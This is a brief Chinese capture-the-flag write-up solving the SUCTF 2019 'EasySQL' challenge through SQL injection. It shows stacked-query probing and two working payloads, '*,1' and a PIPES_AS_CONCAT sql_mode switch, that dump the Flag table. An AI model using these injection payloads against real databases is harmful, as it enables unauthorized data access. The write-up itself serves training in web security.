**[SUCTF 2019]EasySQL**

输入1’、1" 无回显，1有回显，说明是数字型

联合查询`1 union select database()#`发现输出nonono

尝试堆叠查询

`1;show tables#`有结果，拿到表Flag

`1;show columns from Flag#`无结果

当输入0和其余字符是不回显，输入非零字符时回显相同结果，猜测查询语句中有||逻辑或运算，这样"非零数字||表中字段"结果位1（True）

猜测后端语句为`select 查询 || 表中字段 from flag;`

方法1

通过逻辑或，payload为`*,1`

拼接结果为`select *,1 || 字段 from FLag;`

段路径 `1||字符  结果为1` 

即为`select *,1 from Flag;`

方法2

`set sql_mode=PIPES_AS_CONCAT`

`PIPES_AS_CONCAT` 是 MySQL 的 `sql_mode` 中的一个选项，启用后会把 || 当作字符串拼接符（类似 CONCAT()）  

payload为`1;set sql_mode=PIPES_AS_CONCAT;select1`